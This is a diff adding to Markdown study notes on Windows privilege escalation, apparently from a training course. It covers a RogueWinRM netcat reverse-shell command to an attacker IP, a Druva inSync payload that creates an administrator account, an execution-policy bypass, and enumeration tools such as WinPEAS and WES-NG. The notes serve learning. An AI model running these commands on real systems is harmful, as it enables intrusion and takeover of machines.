@@ -141,3 +141,32 @@
 	- Use the Web shell to trigger the `RogueWinRM` exploit using `RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <attacker-ip> 4442`.
 		- `-p` specifies the executable to be run by the exploit, which is `nc64.exe` in this case.
 		- `-a` used to pass arguments to the executable. Since we want the `nc64` to establish a reverse shell against our attacker machine, the argument to pass to netcat will be `-e cmd.exe <attacker-ip> 4442`.
+## *Vulnerable Software*
+- #### *Unpatched Software*
+	- Software and drivers could present various privilege escalation opportunities, since organizations and users may not update them as often.
+	- Use the `wmic` tool to list software installed on the system `wmic product get name,version,vendor`.
+	- This command sometimes doesn't return all the installed programs. Checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
+	- Once the installed software and their versions are found, search for existing exploits on sites like Exploit-db, packet storm, or Google.
+	- **Case: Druva inSync 6.6.3**
+		- Vulnerability occurs because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only.
+		- RPC allows a given process to expose functions over the network so that other machines can call them remotely.
+		- Procedure number 5 in Druva inSync allowed anyone to request the execution of any command.![](druva-insync.png)
+		- ![](druva-insync-exploit.png)
+		- Update the payload to be `net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add` to create a user named `pwnd` with password `SimplePass123` and add him to the group `administrators`.
+## *Tools*
+- #### *WinPEAS*
+	- A script that enumerates the target system to uncover privilege escalation paths.
+	- Download through [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).
+- #### *PrivescCheck*
+	- PowerShell script that searches common privilege escalation on target.
+	- Alternative to WinPEAS without requiring the execution of a binary file.
+	- Download through [here](https://github.com/itm4n/PrivescCheck).
+	- To run PrivescCheck, you may need to bypass the execution policy restrictions using `Set-ExecutionPolicy Bypass -Scope process -Force` and then `. .\PrivescCheck.ps1` and `Invoke-PrivescCheck`.
+- #### *WES-NG: Windows Exploit Suggester - Next Generation*
+	- Some exploit suggesting scripts like WinPEAS will require you to upload them to the target system and run them there. This may cause the antivirus software to detect and delete them.
+	- To avoid making unnecessary noise, use WES-NG which runs on the attacking machine.
+	- A Python script that can be downloaded through [here](https://github.com/bitsadmin/wesng).
+	- Once installed, and before using it, type `wes.py --update` to update the database.
+	- To use the script, you will need to run the `systeminfo` command on the target system and direct the output to a text file `systeminfo > sysinfo.txt`, then transfer this file to the attacking machine and run `wes.py sysinfo.txt`.
+- #### *Metasploit*
+	- If a Meterpreter shell already gained on the system, you can run the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and give a path to privilege escalate.
